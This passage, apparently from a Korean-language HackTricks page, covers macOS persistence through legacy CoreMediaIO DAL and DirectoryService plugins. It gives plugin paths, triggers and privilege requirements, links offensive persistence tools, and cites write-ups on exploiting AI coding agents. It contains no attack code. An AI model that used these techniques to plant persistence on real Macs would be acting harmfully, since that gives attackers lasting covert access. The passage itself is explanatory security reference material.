Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
최소 예제: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **레거시 메커니즘:** macOS 12.3부터 지원이 중단되었습니다. macOS 14.1 이상에서는 레거시 비디오 플러그인이 기본적으로 비활성화됩니다. 이 경로가 작동하려면 사용자가 Recovery에서 레거시 비디오 지원을 복원해야 합니다. 쓰기 가능한 디렉터리만으로는 충분하지 않습니다. [Apple의 최신 지원 안내](https://support.apple.com/en-us/108387).
- 플러그인 디렉터리에 쓰려면 root 권한이 필요합니다. 코드는 호환되는 클라이언트가 여전히 DAL 플러그인을 로드하는 경우에만 실행될 수 있습니다. macOS 26에서는 런타임 테스트를 하지 않았습니다.

#### 위치

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - root 권한 필요
  - **트리거:** 호환되는 카메라 클라이언트가 **레거시 지원이 복원된 후** 장치를 열거합니다. 클라이언트의 library validation이 타사 플러그인을 차단할 수 있습니다.

#### 설명 및 악용

CoreMediaIO **DAL**(Device Abstraction Layer) 플러그인은 일부 카메라 애플리케이션에서 프로세스 내로 로드되었습니다. Apple의 [카메라 확장 프레젠테이션](https://developer.apple.com/videos/play/wwdc2022/10022/)에 따르면 레거시 DAL 플러그인은 FaceTime, QuickTime Player, Photo Booth에서 작동하지 **않았으며**, 다른 많은 클라이언트는 library validation을 적용합니다. 최신 [Core Media I/O 확장](https://developer.apple.com/documentation/coremediaio)은 별도의 설치 및 승인 모델을 사용해 프로세스 외부에서 실행됩니다. 과거의 프로세스 내 기법이 현재 macOS에서 일반적인 Camera TCC 우회를 의미하지는 않습니다.<sup>[[53]](#references)[[54]](#references)</sup>

macOS 26에서 읽기 전용으로 확인한 결과, `/Library/CoreMediaIO/Plug-Ins/DAL`이 존재하며 root 소유입니다. 레거시 지원 여부와 클라이언트에서의 로드 여부는 확인하지 않았습니다.

### Directory Service 플러그인

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **레거시 조건부 메커니즘:** 설치하려면 root 권한이 필요하며, 실제로 구성되고 로드되는 플러그인이어야 합니다. DirectoryService의 플러그인 API는 deprecated 상태입니다. 이를 부팅 트리거로 간주하기 전에 대상 Mac의 Open Directory 구성을 확인하세요.

#### 위치

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - root 권한 필요
  - **트리거:** Open Directory에서 필요할 때 `dspluginhelperd`가 사용 가능한 구성된 플러그인을 로드합니다. [Apple의 플러그인 런타임 가이드](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html)에 따르면 시작 시 로드하도록 구성되지 않은 플러그인은 해당 노드가 열릴 때 지연 로드될 수 있습니다.

#### 설명 및 악용

`dspluginhelperd`는 레거시 DirectoryService 플러그인 번들을 지원합니다. 레거시 플러그인이 승인되고 활성화되는 환경에서는 악성 플러그인을 권한 있는 코드 실행 경로로 사용할 수 있습니다. 이는 PAM 및 Authorization Plugins와는 별개의 경로입니다. 디렉터리가 존재한다고 해서 새로 작성한 플러그인이 다음 부팅 때 실행된다는 뜻은 아닙니다. macOS 26.5의 Apple 로컬 `dspluginhelperd(8)` 및 `opendirectoryd(8)` 매뉴얼에는 여전히 해당 helper와 이 레거시 경로가 나와 있습니다.<sup>[[53]](#references)</sup>

macOS 26에서 읽기 전용으로 확인한 결과, `/Library/DirectoryServices/PlugIns`와 `/usr/libexec/dspluginhelperd`가 존재합니다. 이 테스트 중 플러그인을 설치하거나 구성하거나 로드하지 않았습니다.

## Persistence 기법 및 도구

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025년, Infostealer의 해](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [익숙한 LaunchAgents를 넘어서 - 1 - shell 시작 파일](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [익숙한 LaunchAgents를 넘어서 - 18 - X11 및 XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [익숙한 LaunchAgents를 넘어서 - 21 - 다시 열린 애플리케이션](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [익숙한 LaunchAgents를 넘어서 - 20 - Terminal 환경설정](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [익숙한 LaunchAgents를 넘어서 - 13 - 오디오 플러그인](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit 플러그인 (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [익숙한 LaunchAgents를 넘어서 - 12 - QuickLook 플러그인](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [익숙한 LaunchAgents를 넘어서 - 22 - LoginHook 및 LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [익숙한 LaunchAgents를 넘어서 - 4 - cron 작업](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [익숙한 LaunchAgents를 넘어서 - 2 - iTerm2 시작](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [익숙한 LaunchAgents를 넘어서 - 7 - xbar 플러그인](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [익숙한 LaunchAgents를 넘어서 - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [익숙한 LaunchAgents를 넘어서 - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [익숙한 LaunchAgents를 넘어서 - 3 - 로그인 항목](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [익숙한 LaunchAgents를 넘어서 - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [익숙한 LaunchAgents를 넘어서 - 24 - 폴더 동작](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [macOS에서 Persistence를 위한 폴더 동작 (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [익숙한 LaunchAgents를 넘어서 - 27 - Dock 단축키](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [익숙한 LaunchAgents를 넘어서 - 17 - 색상 선택기](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [익숙한 LaunchAgents를 넘어서 - 26 - Finder Sync 플러그인](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] ["Mac File Opener" Persistence 분석 (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [익숙한 LaunchAgents를 넘어서 - 16 - 화면 보호기](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [접근 권한 유지하기: macOS Persistence를 위한 화면 보호기 (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [익숙한 LaunchAgents를 넘어서 - 11 - Spotlight 가져오기 도구](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [익숙한 LaunchAgents를 넘어서 - 9 - 환경설정 패널](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [익숙한 LaunchAgents를 넘어서 - 19 - 주기적 스크립트](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [익숙한 LaunchAgents를 넘어서 - 5 - Pluggable Authentication Modules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [익숙한 LaunchAgents를 넘어서 - 28 - Authorization 플러그인](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Authorization 플러그인을 이용한 지속적 자격 증명 탈취 (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [익숙한 LaunchAgents를 넘어서 - 30 - man 설정 파일 - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [익숙한 LaunchAgents를 넘어서 - 25 - Apache2 모듈](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [익숙한 LaunchAgents를 넘어서 - 31 - BSM 감사 프레임워크](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [익숙한 LaunchAgents를 넘어서 - 23 - emond, 이벤트 모니터 데몬](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [익숙한 LaunchAgents를 넘어서 - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [익숙한 LaunchAgents를 넘어서 - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [익숙한 LaunchAgents를 넘어서 - 10 - 애플리케이션 스크립트 파일](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [익숙한 LaunchAgents를 넘어서 - 32 - Dock Tile 플러그인](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [익숙한 LaunchAgents를 넘어서 - 33 - 위젯](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [익숙한 LaunchAgents를 넘어서 - 34 - launchd 부팅 작업](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [익숙한 LaunchAgents를 넘어서 - 35 - NVRAM을 통한 Persistence (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [OS X에서 Persistence를 위해 이메일 사용하기 (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [의심스러운 Apple Mail 규칙 Plist 수정 (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [악성 프로파일 - Mac에 가장 심각한 위협 중 하나 (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [Mac 악성코드의 기술 Vol.1 - Ch.0x2 Persistence (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [CVE-2024-44243 분석: kernel extension을 통한 macOS SIP 우회 (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [Claude Code 프로젝트 파일을 통한 RCE 및 API Token 유출 (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [GitHub Copilot 및 Cursor의 새로운 취약점 - Rules 파일 백도어 (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome - 대체 설치 방법 (External Extensions)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [Mac의 Chrome에서 ExtensionInstallForcelist 제거하기 (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Sudo 플러그인 작성하기 (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [사용자 지정 URL Scheme을 통한 원격 Mac 악용 (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [플러그인을 악용하는 두 가지 macOS Persistence 기법 (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [CoreMediaIO DAL 최소 예제 (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: Spotlight 기반 macOS TCC 취약점 분석 (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Python `site` 모듈 문서 (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
- [57] [Spotlight에서 Apple Intelligence까지 — 0day를 악용해 macOS AI를 구동하는 데이터 탈취하기](https://objective-see.org/blog/blog_0x81.html)
{{#include ../banners/hacktricks-training.md}}
